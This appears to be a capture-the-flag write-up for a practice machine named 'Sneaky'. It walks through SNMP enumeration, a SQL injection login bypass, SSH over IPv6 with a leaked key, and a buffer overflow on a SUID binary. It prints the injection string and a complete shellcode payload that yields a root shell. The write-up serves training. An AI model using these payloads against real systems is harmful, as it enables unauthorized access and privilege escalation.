@@ -1,0 +1,77 @@
+Sneaky
+
+29th October 2017 / Document No D17.100.34
+
+Prepared By: Alexander Reid (Arrexel)
+Machine Author: trickster0
+Difficulty: Medium
+Classification: Official
+
+                                                                         Page 1 / 7
+SYNOPSIS
+
+Sneaky, while not requiring many steps to complete, can be difficult for some users. It explores
+enumeration through SNMP and has a beginner level buffer overflow vulnerability which can be
+leveraged for privilege escalation.
+
+Skills Required                      Skills Learned
+
+ Intermediate/advanced knowledge of   Basic SQL injection
+    Linux                             Enumerating SNMP
+                                      Exploiting SUID files
+ Basic understanding of SNMP          Basic buffer overflow exploitation
+
+                                                     Page 2 / 7
+Enumeration
+Nmap
+
+Nmap reveals only two open services; Apache and SNMP.
+                                                                                                                   Page 3 / 7
+Dirbuster
+
+Fuzzing the Apache server reveals a /dev directory.
+                                                                                                                   Page 4 / 7
+Exploitation
+SQL Injection
+
+SQL injection on the d ev page is trivial. Simply passing ` or 1=1;-- as the password will completely
+bypass the login and reveal an SSH key as well as a system username. The issue now arises that
+there is seemingly no SSH server available on the target.
+
+                                                                                                                   Page 5 / 7
+SNMP
+
+Running SNMPWalk against the target with the default passphrase reveals a wealth of
+information about the system.
+Most importantly, an IPv6 address is exposed at MiB iso.3.6.1.2.1.4.34.1.5.2.16. The address must
+be converted from integer to hex and changes when the machine is reset. It can be obtained with
+the command s nmpwalk -Os -c public -v 1 10.10.10.20. In this case, the address is
+dead:beef:0000:0000:0250:56ff:feaa:4e1e
+
+With the address and SSH key at hand, it is now possible to connect via SSH with the command
+ssh -i ssh.key -6 thrasivoulos@dead:beef:0000:0000:0250:56ff:feaa:4e1e
+
+                                                                                                                   Page 6 / 7
+Privilege Escalation
+Buffer Overflow
+
+LinEnum: https://github.com/rebootuser/LinEnum
+/bin/sh shellcode: http://shell-storm.org/shellcode/files/shellcode-811.php
+Running LinEnum reveals a non-standard SUID binary at / usr/local/bin/chal. Attempting to run
+the binary with a large argument produces a segmentation fault, and it is fairly obvious that it is
+vulnerable to a buffer overflow exploit.
+Running the binary in gdb with a pattern reveals that the EIP offset is 362 bytes. The buffer
+appears to start roughly around 0xbffff760 in this case, so a return address of 0 xbffff7b0 w ill be
+used in the payload to account for any shift in addresses. The target is little endian, so the return
+address must be provided in reverse order.
+The payload is very simple as far as buffer overflows as concerned. It is (with a 28 byte /bin/sh
+shellcode) a 334 byte long NOP sled, followed by the shellcode, and then the return address. The
+following command will immediately grant a root shell.
+/usr/local/bin/chal $(python -c "print '\x90'*334 +
+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\x
+cd\x80\x31\xc0\x40\xcd\x80' + '\xb0\xf7\xff\xbf' ")
+
+The flags can be obtained from /home/thrasivoulos/user.txt and /root/root.txt
+
+                                                                                                                   Page 7 / 7
+
